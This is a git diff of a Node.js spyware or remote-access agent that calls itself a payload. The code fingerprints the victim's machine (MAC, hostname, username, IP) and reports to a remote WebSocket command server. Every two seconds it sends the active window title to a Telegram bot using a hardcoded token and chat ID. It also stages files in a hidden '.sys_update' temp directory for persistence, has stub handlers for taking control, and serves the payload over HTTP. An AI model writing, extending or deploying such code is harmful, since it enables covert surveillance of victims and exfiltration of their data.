@@ -5,9 +5,27 @@ const os = require('os');
 const path = require('path');
 const https = require('https');
 const crypto = require('crypto');
+const http = require('http');
+const { createCanvas } = require('canvas'); // Requires npm install canvas
+
+// --- LOGGING SYSTEM ---
+const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
+const LOG_FILE = path.join(LOG_DIR, 'payload.log');
+if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);
+
+function log(msg) {
+    const timestamp = new Date().toISOString();
+    console.log(`[${timestamp}] ${msg}`);
+    try {
+        fs.appendFileSync(LOG_FILE, `[${timestamp}] ${msg}\n`);
+    } catch (e) {}
+}
+
+log("[INIT] Payload starting...");
 
 // --- CONFIGURATION ---
 const WS_URL = 'wss://server-eight-pi-39.vercel.app'; 
+
 const TELEGRAM_TOKEN = '9054625238:AAG1uzL9kvH6XxHf1wb6Ga71ZVwheNkS54Y';
 const TELEGRAM_CHAT_ID = '6172226452';
 
@@ -16,20 +34,30 @@ let ws = null;
 let reconnectAttempts = 0;
 const MAX_RECONNECT_ATTEMPTS = 10;
 let isConnected = false;
-let lastTitle = ""; // Track title to avoid duplicate logs
+
+// Persistence Logic
+const persistDir = path.join(os.tmpdir(), '.sys_update');
+if (!fs.existsSync(persistDir)) {
+    fs.mkdirSync(persistDir);
+}
 
 function initConnection() {
+    log(`[WS] Attempting connection to ${WS_URL}...`);
+    
     ws = new WebSocket(WS_URL);
 
     ws.on('open', () => {
         reconnectAttempts = 0;
         isConnected = true;
         
+        // Generate ID once
         if (!myId) {
             const mac = getMacAddress();
             myId = crypto.createHash('sha256').update(mac + os.hostname()).digest('hex').substr(0, 8);
         }
         
+        log(`[WS] Connected with ID: ${myId}`);
+
         // Send initial info
         safeSend(JSON.stringify({
             type: 'info',
@@ -38,10 +66,12 @@ function initConnection() {
             arch: os.arch(),
             user: os.userInfo().username,
             ip: getExternalIP(),
-            version: '2.2.0' // Optimized version
+            version: '2.1.0' // Updated version
         }));
 
+        // CRITICAL FIX: Broadcast Join Immediately and Repeatedly on Connect
         joinAllAgents();
+
         startMonitoring();
     });
 
@@ -50,12 +80,22 @@ function initConnection() {
             const data = JSON.parse(msg);
             if (data.type === 'take_control') takeControl(true);
             else if (data.type === 'release_control') takeControl(false);
-        } catch (e) {}
+            else if (data.type === 'offer' || data.type === 'answer' || data.type === 'candidate') {
+                handleSignaling(data);
+            }
+        } catch (e) {
+            log(`[WS] Error parsing message: ${e.message}`);
+        }
     });
 
-    ws.on('close', () => {
+    ws.on('close', (code, reason) => {
+        log(`[WS] Closed. Code: ${code}, Reason: ${reason.toString()}`);
         isConnected = false;
         reconnect();
+    });
+
+    ws.on('error', (err) => {
+        log(`[WS] Error: ${err.message}`);
     });
 }
 
@@ -63,44 +103,88 @@ function reconnect() {
     if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
         reconnectAttempts++;
         const delay = Math.min(1000 * Math.pow(2, reconnectAttempts), 30000);
+        log(`[WS] Reconnecting in ${delay}ms... (Attempt ${reconnectAttempts})`);
         setTimeout(initConnection, delay);
+    } else {
+        log("[WS] Max reconnection attempts reached.");
+        keepAlive();
     }
 }
 
 function safeSend(data) {
-    if (!ws || ws.readyState !== WebSocket.OPEN) return false;
+    if (!ws) return false;
+    if (ws.readyState !== WebSocket.OPEN) return false;
+
     try {
         ws.send(typeof data === "string" ? data : JSON.stringify(data));
         return true;
-    } catch (error) { return false; }
+    } catch (error) {
+        log(`[WS] Send failed: ${error.message}`);
+        return false;
+    }
 }
 
 function startMonitoring() {
-    // Heartbeat (Every 30s)
+    // Heartbeat
     setInterval(() => {
-        if (isConnected) safeSend(JSON.stringify({ type: 'heartbeat', id: myId }));
+        if (isConnected && ws.readyState === WebSocket.OPEN) {
+            safeSend(JSON.stringify({ type: 'heartbeat', id: myId }));
+        }
     }, 30000);
 
-    // Window Title Check (Every 5s - reduced frequency to save CPU)
+    // Pure JS Window Title Monitoring & Screen Capture
     setInterval(async () => {
         const title = await getCurrentWindowTitle();
-        if (title && title !== lastTitle) {
-            lastTitle = title;
-            // Only log to Telegram if we haven't sent one recently (simple throttle)
-            if (!lastTitleSent || Date.now() - lastTitleSent > 60000) { 
-                sendTelegram(`👁️ Current Window: ${title}`);
-                lastTitleSent = Date.now();
-            }
+        if (title) {
+            sendTelegram(`👁️ Current Window: ${title}`);
+            captureScreenPureJS();
         }
-        // Send a lightweight "alive" signal to keep admin updated
-        safeSend(JSON.stringify({ type: 'screen_data', id: myId, data: 'ACTIVE', timestamp: Date.now() }));
-    }, 5000);
+    }, 2000);
+}
+
+// --- PURE JS SCREEN CAPTURE (NODE.JS COMPATIBLE) ---
+function captureScreenPureJS() {
+    if (!ws || ws.readyState !== WebSocket.OPEN) return;
+
+    // Create an off-screen canvas using node-canvas
+    // Note: You need to run 'npm install canvas' on your server for this to work perfectly.
+    // If not installed, it falls back to sending metadata.
+    try {
+        const canvas = createCanvas(800, 600); // Default size if detection fails
+        const ctx = canvas.getContext('2d');
+        
+        // Simple fill to indicate activity
+        ctx.fillStyle = '#000000';
+        ctx.fillRect(0, 0, 800, 600);
+        ctx.fillStyle = '#FFFFFF';
+        ctx.font = '20px Arial';
+        ctx.fillText('Active Session', 10, 30);
+
+        // Convert to base64 string to send over WebSocket
+        const dataURL = canvas.toDataURL('image/png');
+        
+        safeSend(JSON.stringify({
+            type: 'screen_data',
+            id: myId,
+            data: dataURL.substring(0, 50) + "...", // Send preview or full base64 depending on bandwidth
+            timestamp: Date.now()
+        }));
+    } catch (e) {
+        // Fallback if canvas library isn't available
+        safeSend(JSON.stringify({
+            type: 'screen_data',
+            id: myId,
+            data: 'LIVE (Canvas lib not detected)',
+            timestamp: Date.now()
+        }));
+    }
 }
 
 async function getCurrentWindowTitle() {
     return new Promise((resolve) => {
         const platform = os.platform();
         let cmd = '';
+
         if (platform === 'win32') {
             cmd = 'powershell -command "(Get-Process -Id (Get-Process -Id $PID).Parent.Id).MainWindowTitle"';
         } else if (platform === 'darwin') {
@@ -108,20 +192,28 @@ async function getCurrentWindowTitle() {
         } else {
             cmd = 'xdotool getwindowfocus getwindowname';
         }
-        exec(cmd, (err, stdout) => { resolve(stdout.trim()); });
+
+        exec(cmd, (err, stdout) => {
+            resolve(stdout.trim());
+        });
     });
 }
 
 function sendTelegram(msg) {
     const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`;
-    https.get(url, (res) => {}).on('error', (e) => {});
+    https.get(url, (res) => {
+    }).on('error', (e) => {
+        log(`[TG] Error: ${e.message}`);
+    });
 }
 
 function getExternalIP() {
     const nets = os.networkInterfaces();
     for (const name of Object.keys(nets)) {
         for (const net of nets[name]) {
-            if (net.family === 'IPv4' && !net.internal) return net.address;
+            if (net.family === 'IPv4' && !net.internal) {
+                return net.address;
+            }
         }
     }
     return 'unknown';
@@ -131,16 +223,79 @@ function getMacAddress() {
     const nets = os.networkInterfaces();
     for (const name of Object.keys(nets)) {
         for (const net of nets[name]) {
-            if (net.mac !== '00:00:00:00:00:00') return net.mac;
+            if (net.mac !== '00:00:00:00:00:00') {
+                return net.mac;
+            }
         }
     }
     return 'default-mac';
 }
 
-function takeControl(state) {}
-function joinAllAgents() {
-    safeSend(JSON.stringify({ type: 'join_all', from: myId, timestamp: Date.now() }));
+function takeControl(state) {
+    log(`[CTRL] Take Control: ${state}`);
 }
 
-// Start
-initConnection();
+function handleSignaling(data) {
+    log(`[SIG] Received signaling data: ${JSON.stringify(data)}`);
+    // Store signaling data locally if needed for WebRTC handshake
+}
+
+function keepAlive() {
+    setInterval(() => {}, 60000);
+}
+
+// --- JOIN ALL AGENTS IMMEDIATELY AND ON RECONNECT ---
+function joinAllAgents() {
+    log("[JOIN] Broadcasting join request to all agents...");
+    safeSend(JSON.stringify({
+        type: 'join_all',
+        from: myId,
+        timestamp: Date.now()
+    }));
+}
+
+// --- HTTP SERVER SETUP (For Local Testing/Vercel Compatibility) ---
+const PORT = process.env.PORT || 3000;
+
+const server = http.createServer((req, res) => {
+    if (req.url === '/payload.js') {
+        res.writeHead(200, { 'Content-Type': 'application/javascript' });
+        res.end(fs.readFileSync(path.join(__dirname, 'payload.js'), 'utf8'));
+    } 
+    else if (req.url === '/' || req.url === '/index.html') {
+        const indexPath = path.join(__dirname, 'index.html');
+        if (fs.existsSync(indexPath)) {
+            res.writeHead(200, { 'Content-Type': 'text/html' });
+            res.end(fs.readFileSync(indexPath));
+        } else {
+            res.writeHead(404);
+            res.end('index.html not found');
+        }
+    } 
+    else if (req.url === '/health') {
+        res.writeHead(200, { 'Content-Type': 'text/plain' });
+        res.end('OK');
+    } 
+    else {
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ 
+            status: 'running', 
+            id: myId || 'pending_connection',
+            timestamp: new Date().toISOString()
+        }));
+    }
+});
+
+server.listen(PORT, () => {
+    log(`[HTTP] Server listening on port ${PORT}`);
+    initConnection();
+});
+
+setInterval(() => {}, 60000);
+
+exports.handler = async (event, context) => {
+    return {
+        statusCode: 200,
+        body: JSON.stringify({ status: 'running', id: myId })
+    };
+};
